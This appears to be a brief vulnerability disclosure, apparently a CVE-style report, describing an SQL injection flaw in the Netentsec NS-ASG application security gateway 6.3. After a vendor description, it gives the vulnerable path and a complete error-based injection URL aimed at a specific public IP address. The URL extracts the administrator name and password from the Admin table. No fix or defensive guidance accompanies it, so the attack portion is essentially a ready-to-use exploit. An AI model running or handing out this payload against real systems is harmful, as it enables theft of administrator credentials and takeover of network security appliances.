Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ：/admin/list_ipAddressPolicy.php

https://1.85.53.53/admin/list_ipAddressPolicy.php?GroupId=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201)))

<img width="583" alt="图片" src="https://github.com/zouzuo1994321/cve/assets/49036599/e0f85c63-60f6-4972-83db-c19a0e97e861">
